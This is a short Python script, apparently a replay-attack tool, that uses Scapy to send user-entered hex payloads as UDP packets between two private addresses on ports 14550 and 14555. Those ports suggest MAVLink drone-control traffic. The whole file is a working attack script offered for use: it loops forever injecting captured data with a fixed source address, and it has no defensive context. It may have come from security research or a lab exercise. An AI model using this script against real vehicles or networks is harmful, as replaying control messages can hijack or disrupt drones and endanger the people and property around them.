# -*- coding: utf-8 -*-
"""
Created on 2022/12/18 13:53
author: erchen
description : 
"""

from scapy.all import *
from scapy.layers.inet import IP, UDP


def replay_attack(data):
    data = bytes.fromhex(data)
    send(IP(src='192.168.43.148', dst='192.168.43.123') / UDP(sport=14550, dport=14555) / data)

if __name__ == '__main__':
    while True:
        mavdata = input('输入重放数据：')
        replay_attack(mavdata)